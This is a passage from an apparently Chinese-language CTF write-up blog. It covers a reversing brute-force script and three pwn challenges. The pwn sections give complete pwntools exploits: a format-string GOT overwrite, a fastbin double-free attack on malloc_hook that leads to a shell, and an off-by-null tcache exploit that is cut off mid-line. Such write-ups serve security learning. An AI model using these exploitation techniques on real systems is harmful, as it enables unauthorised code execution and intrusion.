class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func8</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char + <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure></div>

<p>è‡³æ­¤  sub_4010C0 çš„é€»è¾‘è§£æå®Œæ¯•ã€‚</p>
<p>åœ¨å¯¹ flag ä¸­å­—ç¬¦è¿›è¡Œå¯¹åº”æ“ä½œä¹‹åï¼Œä¼šæŠŠç»“æœå’Œ byte_409064 æ•°æ®æ¯”å¯¹ï¼Œå¦‚æœä¸€è‡´è¯´æ˜è¾“å…¥æ­£ç¡®ã€‚</p>
<p>ç”±äºç®—æ³•æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬çš„æ€è·¯è¿˜æ˜¯çˆ†ç ´ã€‚éå† 0~255 å­—ç¬¦ç©ºé—´ï¼Œå¯¹æ¯ä¸€ä¸ªå­—ç¬¦æ‰§è¡Œä¸€é func_list ä¸­çš„æ“ä½œï¼Œçœ‹çœ‹å’ŒæœŸæœ›ç»“æœæ˜¯å¦ç›¸åŒã€‚çˆ†ç ´è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x5D</span>,<span class="number">0x2E</span>,<span class="number">0x4C</span>,<span class="number">0x35</span>,<span class="number">0x49</span>,<span class="number">0x30</span>,<span class="number">0x06</span>,<span class="number">0x6E</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x64</span>,<span class="number">0x30</span>,<span class="number">0x67</span>,<span class="number">0x72</span>,<span class="number">0x68</span>,<span class="number">0x3C</span>,<span class="number">0x76</span>,<span class="number">0x55</span>,<span class="number">0x5A</span>,<span class="number">0x52</span>,<span class="number">0x58</span>,<span class="number">0x2F</span>,<span class="number">0x7A</span>,<span class="number">0x3A</span>,<span class="number">0x53</span>,<span class="number">0x35</span>,<span class="number">0x5C</span>,<span class="number">0x79</span>,<span class="number">0x2A</span>,<span class="number">0x71</span>,<span class="number">0x09</span>,<span class="number">0x1C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(target))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./data.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">func_list = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    temp = u32(data[i] + data[i + <span class="number">1</span>] + data[i + <span class="number">2</span>] + data[i + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> temp == <span class="number">0x0C8B5BDC6</span>:</span><br><span class="line">        func_list.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C5D0CFB3</span>:</span><br><span class="line">        func_list.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0B5D2B4BE</span>:</span><br><span class="line">        func_list.append(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0BFC7BBB8</span>:</span><br><span class="line">        func_list.append(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C6C9D1D3</span>:</span><br><span class="line">        func_list.append(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C9D3D4D7</span>:</span><br><span class="line">        func_list.append(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0CED6A8B7</span>:</span><br><span class="line">        func_list.append(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0FAB9AEB0</span>:</span><br><span class="line">        func_list.append(<span class="number">8</span>)</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char + <span class="number">1</span>) ^ <span class="number">0x19</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char ^ <span class="number">0x19</span>) - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char ^ <span class="number">0x66</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func5</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func6</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func7</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func8</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char + <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line">token = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        temp = k</span><br><span class="line">        <span class="keyword">if</span> token % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            char = (k ^ <span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            char = (k ^ <span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> func_list:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                char = func1(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">                char = func2(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">3</span>:</span><br><span class="line">                char = func3(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">4</span>:</span><br><span class="line">                char = func4(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                char = func5(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                char = func6(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">7</span>:</span><br><span class="line">                char = func7(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                char = func8(char)</span><br><span class="line">        <span class="keyword">if</span> char == t:</span><br><span class="line">            <span class="built_in">print</span><span class="string">&quot;[*]Found char:&quot;</span> + <span class="built_in">chr</span>(temp)</span><br><span class="line">            flag += <span class="built_in">chr</span>(temp)</span><br><span class="line">            total += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    token += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total: %d&quot;</span> % total)</span><br></pre></td></tr></table></figure></div>

<p>æœ€åç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*]Found char:w</span><br><span class="line">[*]Found char:5</span><br><span class="line">[*]Found char:z</span><br><span class="line">[*]Found char:6</span><br><span class="line">[*]Found char:s</span><br><span class="line">[*]Found char:7</span><br><span class="line">[*]Found char:d</span><br><span class="line">[*]Found char:u</span><br><span class="line">[*]Found char:Q</span><br><span class="line">[*]Found char:t</span><br><span class="line">[*]Found char:R</span><br><span class="line">[*]Found char:7</span><br><span class="line">[*]Found char:A</span><br><span class="line">[*]Found char:y</span><br><span class="line">[*]Found char:F</span><br><span class="line">[*]Found char:S</span><br><span class="line">[*]Found char:T</span><br><span class="line">[*]Found char:V</span><br><span class="line">[*]Found char:h</span><br><span class="line">[*]Found char:Y</span><br><span class="line">[*]Found char:v</span><br><span class="line">[*]Found char:0</span><br><span class="line">[*]Found char:H</span><br><span class="line">[*]Found char:1</span><br><span class="line">[*]Found char:m</span><br><span class="line">[*]Found char:6</span><br><span class="line">[*]Found char:J</span><br><span class="line">[*]Found char:Z</span><br><span class="line">[*]Found char:x</span><br><span class="line">[*]Found char:b</span><br><span class="line">[*]Found char:3</span><br><span class="line">[*]Found char:3</span><br><span class="line">w5z6s7duQtR7AyFSTVhYv0H1m6JZxb33</span><br><span class="line">total: 32</span><br></pre></td></tr></table></figure></div>

<p>Flag: flag{w5z6s7duQtR7AyFSTVhYv0H1m6JZxb33}</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ç®€å•çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¹‹å‰éœ€è¦è¿‡ä¸€ä¸ªå°éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨é€†å‘(å› ä¸ºå¾ˆç®€å•)ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é€‰æ‹©æ·å¾„ï¼Œæ¯”å¦‚è¯´ angrã€‚</p>
<p>ç¼–å†™è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./pwn_MinZhu&quot;</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="number">0x08048817</span>,avoid=<span class="number">0x0804882B</span>)</span><br><span class="line"><span class="built_in">print</span>(res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;xNd9y6\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01&#x27;</span><br></pre></td></tr></table></figure></div>

<p>æ˜¾ç„¶ç­”æ¡ˆæ˜¯ xNd9y6ã€‚</p>
<p>ç„¶åæ¨¡ç‰ˆå¼çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ŒAPI è§£å†³</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn_MinZhu&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.29.1.38&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Key:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;xNd9y6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload1 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x0804A064</span>:<span class="number">10</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>ä¸€ä¸ªæ¯”è¾ƒå¸¸è§„çš„ double free + UAFï¼Œè¦è¯´å­˜åœ¨éš¾åº¦é‚£å°±æ˜¯é™åˆ¶åªèƒ½ç”³è¯· fastbin çš„ chunkï¼Œæ³„æ¼åœ°å€ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œé€šè¿‡ fastbin attack + éƒ¨åˆ†åœ°å€å†™æ§åˆ¶ chunk çš„ size ä½ï¼Œä¼ªé€  unsortedbin chunk è·å– libc addressï¼Œç„¶åå¸¸è§„çš„ fastbin attack æ”¹ malloc_hook å°±å¥½ã€‚è¿™é“é¢˜æœ€åä¸€ä¸ª one_gadget å¯ç”¨ï¼Œçœå»äº† realloc_hook è°ƒæ•´ stack ç»“æ„çš„éº»çƒ¦ã€‚</p>
<p>è¿˜è¦æ³¨æ„ä¸€ç‚¹ index æ˜¯ä» 1 å¼€å§‹çš„ï¼Œæˆ‘ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä» 0 å¼€å§‹ï¼Œå¯¼è‡´å¾ˆå¤šé—®é¢˜ã€‚ã€‚ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;172.29.1.25&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(log_level=&quot;DEBUG&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input the length of data:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input the index of sticky note that you want to delete:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;d&quot;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;e&quot;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;f&quot;</span> * <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)    <span class="comment"># 1 -&gt; 2-&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;\x20&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Total:11,Index-&gt;11\nSticky note:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4c20</span></span><br><span class="line">log.success(<span class="string">&quot;libc: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">malloc_hook = libc_addr + <span class="number">0x3c4afd</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook: 0x%x&quot;</span> % malloc_hook)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf1147</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget: 0x%x&quot;</span> % one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;eeeeeeee&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;eeeeeeee&quot;</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the length of data:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;20&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># flag&#123;IaKls58eEqsARDOfNOgkBWKOTvyqYELT&#125;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>è¿™é“é¢˜æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰åšå‡ºæ¥ï¼Œåé¢å­¦å¼Ÿç»™è¦åˆ°äº†ä¸€ä»½ expï¼Œç®€å•çœ‹ä¸€ä¸‹å‘ç°æ€è·¯ä¸ç®—å¤æ‚ï¼Œå’Œ heapstorm æœ‰äº›ç±»ä¼¼ã€‚</p>
<p>é¢˜ç›®çš„æ¼æ´ç‚¹åœ¨äº add chunk çš„æ—¶å€™è¾“å…¥æ•°æ®ï¼Œåœ¨å­—ç¬¦ä¸²æœ«å°¾è¡¥é›¶å¯¼è‡´ off-by-nullã€‚ä½†æ˜¯ size é™åˆ¶çš„æ¯”è¾ƒæ­»ï¼Œåªèƒ½åˆ†é… fastbin å¤§å°çš„ chunkã€‚</p>
<p>å› ä¸º off-by-null æœ€å¸¸ç”¨çš„æ“ä½œæ˜¯æ„é€  chunk overlapï¼Œä½†æ˜¯è¿™é‡Œåªèƒ½ç”³è¯· fastbin chunk å¯¼è‡´ off-by-null ä¼šè¦†ç›– chunk çš„æ•´ä¸ª sizeï¼Œæ²¡æ³•åˆ©ç”¨ã€‚</p>
<p>å…¶å®è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼Œç”¨åˆ°ä¸€ä¸ªå…³äº scanf å‡½æ•°çš„ç‰¹æ€§ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®å¾ˆé•¿ï¼Œscanf ä¼šè‡ªåŠ¨åœ¨ heap ä¸Šé¢åˆ†é…å†…å­˜ç”¨äºç¼“å†²è¾“å…¥æ•°æ®ã€‚è€Œ malloc åœ¨ç®¡ç† heap çš„æ—¶å€™å­˜åœ¨ä¸€ä¸ª malloc_consolidate è¿‡ç¨‹ï¼Œå½“è¯·æ±‚çš„ size å¾ˆå¤§(å¤§äº small bin èŒƒå›´)çš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥ fastbin ä¸­æ˜¯å¦è¿˜å­˜åœ¨ chunkï¼Œå¦‚æœæ˜¯ï¼Œå°±å°†ä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·å¹¶ä¸”æ”¾å…¥ unsortedbinã€‚</p>
<p>æ‰€ä»¥åªè¦æå‰åœ¨ fastbin ä¸­æ”¾ç½®ä¸€äº› chunkï¼Œç„¶åè§¦å‘ scanf å‡½æ•°çš„ malloc è¿‡ç¨‹ï¼Œfastbin ä¸­çš„ chunk å°±ä¼šè¢«åˆå¹¶åˆ° unsorted binï¼Œä»è€Œå®Œæˆåœ°å€æ³„æ¼ã€overlap ç­‰æ“ä½œã€‚</p>
<p>é¦–å…ˆç”³è¯·ä¸€å®šæ•°é‡çš„ chunkï¼Œç„¶åè§¦å‘ scanf åˆå¹¶å¾—åˆ°ä¸€å—å¤§çš„ unsortedbin chunkã€‚</p>
<p>åˆ©ç”¨ off-by-null æ¼æ´ä¿®æ”¹ chunk sizeï¼Œç¼©å° unsortedbin chunkï¼Œå¾—åˆ°ä¸€å— pre_size ä¸º 0x280 çš„ chunkã€‚</p>
<p>å†åˆ©ç”¨ scanf è§¦å‘ fastbin åˆå¹¶ï¼Œä»è€Œæ„é€ å‡º fake unsortedbinï¼Œå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„ chunkã€‚</p>
<p>åˆ‡å‰² unsortedbin chunkï¼Œä½¿ fd è½åœ¨å¯æ§ chunk å³å¯æ³„æ¼åœ°å€ã€‚å†åˆ‡å‰² unsortedbin chunk å¾—åˆ°ç”¨æ¥æ³„æ¼åœ°å€ chunk çš„æ§åˆ¶æƒï¼Œæ­¤æ—¶è¿™ä¸ª chunk ä¼šåœ¨ chunk_list ä¸­å‡ºç°ä¸¤æ¬¡ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åš double freeï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„ tcache åˆ©ç”¨äº†ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input note len: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Note content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consolidate</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span> * <span class="number">0x600</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):    <span class="comment"># 0 ~ 24</span></span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    <span class="comment"># fill tcache</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">consolidate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span>)    <span class="comment"># clear tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">25</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x78</span>)    <span class="comment"># off by null chunk shrink</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">26</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">27</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">28</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">29</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">30</span>, <span class="number">0x78</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i) </span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">consolidate()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;A&quot;</span>)    <span class="comment"># clear tcache</span></span><br><span class="line">add(<span class="number">31</span>, <span class="number">0x78</span>, <span class="string">&quot;aa&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;27&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span 